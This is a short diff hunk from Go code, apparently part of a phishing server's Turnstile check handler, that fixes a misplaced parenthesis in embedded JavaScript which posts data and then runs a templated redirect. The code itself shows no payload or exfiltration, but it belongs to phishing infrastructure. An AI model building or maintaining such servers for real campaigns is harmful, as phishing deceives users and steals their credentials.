@@ -344,7 +344,7 @@ func (ps *PhishingServer) TurnstileHandler(w http.ResponseWriter, r *http.Reques
 					headers: {
 					  "Content-type": "application/json; charset=UTF-8"
 					}
-				}).then((response) => {console.log("redirecting..."); %s);});
+				}).then((response) => {console.log("redirecting..."); %s;});
 			},
 		});
 	};</script>`
